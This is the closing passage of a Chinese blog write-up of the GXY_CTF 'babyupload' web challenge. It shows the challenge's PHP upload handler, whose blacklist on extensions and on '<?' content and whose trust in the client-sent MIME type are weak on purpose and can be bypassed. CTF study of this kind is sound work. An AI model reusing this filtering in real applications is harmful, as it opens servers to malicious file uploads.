    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/upload/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$t_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploaded_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"后缀名不能有ph！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"
            "</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/pjpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploaded_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"诶，别蒙我啊，这标志明显还是php啊"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"GBK"</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$t_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$t_path</span><span class="token punctuation">}</span></span> succesfully uploaded!"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"上传类型也太露骨了吧！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>GitHub地址：https://github.com/imaginsch/GXY_CTF/tree/master/Web/babyupload</p> 
<hr> 
<h2><a id="_306"></a>总结</h2> 
<p>虽然前面说只给出答案，但还是不知不觉写了解题过程，好费时间，但为了截图又做了一遍题也是蛮好的，又被同事落下好多题了呜呜</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0faf969e2e129d30bf1fe1811e1a0596/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">opencv[c&#43;&#43;] findContours()轮廓特征分析大全(求面积、周长、几何矩、质心、凸包、最小外接矩形、最小外接三角形、最小外接椭圆等)---后续完善总结版本</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/c78bc5d8877d527ea302e3e32eee0473/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Halcon算子rft_generic()参数解析及应用</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>